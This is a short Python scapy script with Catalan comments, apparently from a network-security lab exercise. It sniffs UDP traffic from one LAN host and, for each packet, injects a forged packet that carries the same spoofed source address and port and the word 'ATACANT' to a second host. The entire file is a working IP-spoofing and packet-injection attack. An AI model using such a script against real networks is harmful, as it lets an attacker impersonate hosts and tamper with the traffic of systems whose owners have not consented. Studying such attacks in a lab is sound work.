from scapy.all import sniff, IP, UDP, Raw, send
import time

# 🎯 Configuració
INTERFACE = "enp0s3"
FILTER = "udp and src host 192.168.0.100 and src port 3132"
TARGET_IP = "192.168.0.102"
TARGET_PORT = 3132

print(f"\n🎧 Escoltant a {INTERFACE} amb filtre: {FILTER}\n")

def process_packet(packet):
    if IP in packet and UDP in packet and Raw in packet:
        print("=" * 60)
        print(f"📥 Rebut de {packet[IP].src}:{packet[UDP].sport}")
        print(f"📦 Ignorant payload original. Enviant només: ATACANT")

        # 📤 Crear paquet spoofejat amb només "ATACANT"
        spoofed_packet = IP(src="192.168.0.100", dst=TARGET_IP) / \
                         UDP(sport=3132, dport=TARGET_PORT) / \
                         Raw(load=b"ATACANT")

        time.sleep(3)
        send(spoofed_packet, verbose=False)
        print(f"📤 Reenviat amb contingut 'ATACANT' cap a {TARGET_IP}:{TARGET_PORT}")
        print("=" * 60)

# ▶️ Inicia l’esnifador
sniff(filter=FILTER, iface=INTERFACE, prn=process_packet)
